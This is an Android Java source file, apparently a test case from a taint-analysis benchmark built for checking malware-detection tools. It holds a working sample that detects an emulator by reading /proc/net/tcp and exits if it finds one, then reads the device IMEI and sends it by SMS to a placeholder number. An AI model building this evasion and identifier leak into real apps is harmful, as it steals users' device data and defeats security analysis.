
package de.ecspride;

import java.io.BufferedReader;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Iterator;

import android.app.Activity;
import android.content.Context;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;
/**
 * @testcase_name Network2
 * Practically the same from netH.patch
 * Rage Against the Virtual Machine: Hindering Dynamic Analysis of Android Malware. Thanasis Petsas et al.
 */
public class Network2 extends Activity {
	
	@Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d("IBM", "start");
        setContentView(R.layout.network2);

        if (isEmulator() == 1)
        {
          System.exit(0);
          return;
        }
        String imei = ((TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE)).getDeviceId(); //source

    	SmsManager sms = SmsManager.getDefault();
		Log.d("IBM", "sending SMS: "+imei);
		sms.sendTextMessage("+49 1234", null, imei, null, null);  //sink
		Log.d("IBM", "end");
    }
	
	private int isEmulator()
	{
	  BufferedReader localBufferedReader = null;
	  try
	  {
	    localBufferedReader = new BufferedReader(new InputStreamReader(new FileInputStream("/proc/net/tcp")), 1000);
	    String line = null;
		while ((line = localBufferedReader.readLine()) != null) {
			String[] a = line.split("\\W+");	
			Log.d("IBM","a2: "+a[2] + " - a3: "+a[3]);
			if (a[2].equals("0F02000A")){
				localBufferedReader.close();
				return 1;
			}
			int port;
			try{
			    port = Integer.parseInt(a[3], 16);
			} catch (Exception e) {
				port = 0;						
			}
			if (port >= 5555 && port < 5585){
				localBufferedReader.close();
				return 1;
		    }
		}
		localBufferedReader.close();
		return 0;
	  }
	  catch (IOException localIOException)
	  {  return 0;
	  }
	}
}
